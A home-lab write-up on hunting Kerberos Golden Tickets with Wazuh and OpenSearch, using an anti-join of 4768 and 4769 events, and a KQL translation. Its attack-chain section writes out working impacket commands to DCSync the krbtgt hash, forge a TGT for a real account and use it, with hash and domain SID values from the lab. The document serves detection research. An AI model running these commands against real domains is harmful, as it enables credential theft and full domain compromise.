# Lab 02 - Golden Ticket Anti-Join Hunt

## Objective
Detect a **Golden Ticket** - a Kerberos TGT forged offline with the stolen
`krbtgt` key, granting an attacker arbitrary identity and access. Module 06 Lab
06A proved this cannot be caught by a single-event rule: a forged service-ticket
request (4769) is **field-identical** to a legitimate one. The real signal is a
*missing* 4768 - the attacker forges the login ticket offline, so it never reaches
the DC. That is an **absence-correlation** across two event types, which Wazuh's
stateless, first-match rule engine structurally cannot express.

This lab does what a rule cannot: run the missing-4768 detection as a **hunt** - an
**anti-join** over stored 4768/4769 telemetry - and prove it isolates a live
Golden Ticket while clearing legitimate accounts. **No custom rule** (the anti-join
is not expressible as one; that is the finding). Rule namespace 100700 stays
reserved for the capstone.

## MITRE ATT&CK
| Field | Value |
|---|---|
| Tactic | Credential Access / Persistence (TA0006 / TA0003) |
| Technique | **T1558.001** - Steal or Forge Kerberos Tickets: Golden Ticket |
| Log source | Windows Security channel, events **4768** (TGT / AS-REQ) and **4769** (service ticket / TGS-REQ) |
| Detection type | Threat hunt (stateful anti-join), not a rule |
| Reference | https://attack.mitre.org/techniques/T1558/001/ |

## Environment
| Component | Details |
|---|---|
| Domain controller / sensor | `DC01` (Windows Server 2022), `lab.local`, 192.168.56.10, agent **004** |
| Attacker | Kali + impacket (`secretsdump`, `ticketer`, `getST`), 192.168.56.80, agent 001 |
| Manager | Wazuh 4.14.6, Ubuntu, 192.168.56.79; **archives indexed** (Lab 01) |
| Impersonated account | `svc-sql` (real, RID 1104) - quiet: never legitimately authenticates |
| Query engine | OpenSearch PPL (`_plugins/_ppl`) via Dev Tools / REST |

## Prerequisite - the data foundation (Lab 01)
The hunt is impossible without indexed archives. A **successful** 4768/4769 is a
level-0 event: it never enters `wazuh-alerts-*`. Lab 01 enabled `logall_json` +
Filebeat archives, so both event types now land in `wazuh-archives-*`. Lab 01 also
fixed the lookback bound: a TGT is valid **10 hours**, so the anti-join window must
exceed 10h or legitimate users whose 4768 predates the window read as forged.
Archives had been running >24h before this hunt.

## The attack chain

### 1. Steal the krbtgt key (DCSync)
```bash
impacket-secretsdump lab.local/Administrator@192.168.56.10 -just-dc-user krbtgt
#   krbtgt:502:...:e4e62d01f9e5282caa1ebbd6903ded6b:::   (NTLM key)
```
DCSync uses the directory-replication protocol (DRSUAPI) over NTLM - **clock-
independent**, unlike the Kerberos steps that follow.

### 2. Forge the ticket offline (no DC contact -> no 4768)
```bash
impacket-ticketer -nthash e4e62d01f9e5282caa1ebbd6903ded6b \
  -domain-sid S-1-5-21-1510813927-2919259697-3260277280 \
  -domain lab.local -user-id 1104 svc-sql
```
The TGT is built and signed locally with the krbtgt key. **No AS-REQ is sent, so
the DC logs no 4768 for svc-sql.** That absence is the only reliable fingerprint.

**Why a real account with its real RID.** Lab 06A established that on patched
Server 2022, a Golden Ticket for a *non-existent* user is rejected
(`KDC_ERR_TGT_REVOKED`) and logs no 4769 - PAC validation checks the user SID. So
the forge must impersonate a real account (`svc-sql`, RID 1104). `svc-sql` was
chosen because it is **quiet** - it never legitimately requests a TGT, so any 4769
for it with no 4768 is unambiguous.

### 3. Use the forged ticket (generates the orphan 4769)
```bash
KRB5CCNAME=svc-sql.ccache impacket-getST -spn cifs/dc01.lab.local -k -no-pass \
  lab.local/svc-sql -dc-ip 192.168.56.10
#   [*] Saving ticket in svc-sql@cifs_dc01.lab.local@LAB.LOCAL.ccache   (accepted - no revoke)
```
A **legitimate baseline** was generated alongside it for contrast: `getTGT` +
`getST` as Administrator, producing a matched 4768->4769 pair from the same Kali IP.

## What the DC logged
| Source | Event | User | etype | Client IP | Rule fired |
|---|---|---|---|---|---|
| Legit baseline (getTGT) | 4768 | `Administrator` | - | 192.168.56.80 | none (**level 0**) |
| Legit baseline (getST) | 4769 | `Administrator@LAB.LOCAL` | 0x12 (AES) | 192.168.56.80 | **100604, level 10** |
| **Golden Ticket (getST)** | **4769** | `svc-sql@LAB.LOCAL` | **0x12 (AES)** | 192.168.56.80 | **none (level 0)** |
| Internal (normal) | 4769 | `DC01$@LAB.LOCAL` | 0x12 | `::1` | 60106, level 3 |

Three things this table proves live:
1. **The Golden Ticket fired no alert.** svc-sql's 4769 scored level 0 - invisible
   to the alerts index. Single-event detection is blind, exactly as 06A predicted.
2. **Both attack tickets are etype 0x12 (AES).** The RC4 tell does not apply - the
   4769 etype is the *service* ticket's, not the forged TGT's. Encryption type
   cannot separate forged from legitimate.
3. **The Lab 06B tripwire (100604) produced a false positive.** It fired on the
   *legitimate* Administrator logon (remote built-in-Administrator 4769) and stayed
   silent on the actual Golden Ticket. The single-event heuristic alarms on the
   benign event and misses the dangerous one - 06B asserted this; here it is
   reproduced end to end.

## The hunt - an anti-join over 4768/4769

Two PPL passes plus a set difference. Run in Dev Tools (`POST _plugins/_ppl`):

```sql
-- LIST A: accounts that requested a service ticket (4769)
source=wazuh-archives-* | where data.win.system.eventID='4769'
  | stats count() by data.win.eventdata.targetUserName
--   Administrator@LAB.LOCAL | DC01$@LAB.LOCAL | svc-sql@LAB.LOCAL

-- LIST B: accounts that requested a login ticket (4768)
source=wazuh-archives-* | where data.win.system.eventID='4768'
  | stats count() by data.win.eventdata.targetUserName
--   Administrator | DC01$
```

**Golden Ticket suspects = normalize(A) - B:**

| User (normalized) | In A (4769) | In B (4768) | Verdict |
|---|---|---|---|
| Administrator | yes | yes | legit - has a login |
| DC01$ | yes | yes | legit - machine account |
| **svc-sql** | yes | **no** | **GOLDEN TICKET - service ticket, no login** |

The anti-join isolates `svc-sql` and clears the two legitimate accounts.

### The normalization trap (a real finding)
4769 stores the user as `svc-sql@LAB.LOCAL`; **4768 stores it as plain
`svc-sql`** (no realm). A naive string anti-join therefore flags **every** account -
none of the `@LAB.LOCAL` forms appear in List B - producing false positives on
Administrator and DC01$. The two event types write the same identity in different
formats; the hunt must strip `@REALM` before comparing. This is invisible until you
run it and is exactly the kind of defect a "just diff the two lists" description
hides.

## Why this is a hunt, not a rule
Wazuh evaluates one event at a time, first-match-wins. Catching this requires
holding the **set of all 4768 users** and, for each incoming 4769, testing set
membership - a join across events, i.e. state. Wazuh's engine has none, so
"a 4769 whose user has no 4768" is inexpressible as a rule. A query engine that
holds both sets at once (PPL two-pass + diff here) does it directly.

### Sentinel translation (untested - not run in Sentinel)
The same anti-join is one operator in KQL:
```kql
let TGTs = SecurityEvent | where EventID == 4768 | distinct TargetUserName;
SecurityEvent
| where EventID == 4769 and IpAddress !in ("::1")
| extend user = tostring(split(TargetUserName, "@")[0])   // strip the realm
| where user !in (TGTs)
```
`join kind=leftanti` / `!in` expresses natively what Wazuh cannot. This is written
from the technique, **not executed in Sentinel** - no claim it ran.

## Key findings
- **A live Golden Ticket is invisible to alerting** (level-0 4769) and
  **field-identical** (AES etype) to legitimate traffic - single-event detection
  fails, as 06A argued.
- **The anti-join works**: normalize(4769 users) - (4768 users) isolates the forged
  `svc-sql` and clears legitimate accounts.
- **Realm-format normalization is mandatory** - 4769 carries `user@REALM`, 4768
  carries `user`; skipping the strip flags every account.
- **The stateless engine cannot express the anti-join** - it is structurally a
  hunt, not a rule.
- **The pragmatic fallback (rule 100604) false-positived live** on the legitimate
  Administrator logon while missing the Golden Ticket - the cost of forcing a
  stateful detection into a stateless rule.
- **10h lookback floor** (TGT lifetime) and **indexed archives** (Lab 01) are hard
  prerequisites; without them the hunt is meaningless or impossible.

## Result
A Golden Ticket forged from a DCSync'd krbtgt key generated a level-0, AES,
field-identical 4769 that fired no alert - and the single-event tripwire rule
100604 false-positived on the legitimate control instead. A two-pass PPL anti-join
over `wazuh-archives-*` (with realm normalization) isolated the forged `svc-sql`
ticket by the absence of a matching 4768, doing what the rule engine structurally
cannot. **No custom rule** - the detection is a hunt by necessity. Next: **Lab 03 -
beacon periodicity** (stack-counting Sysmon EID3 inter-connection gaps), then the
**Lab 04 capstone** - promote a hunt to a rule, or document why it must stay a hunt.
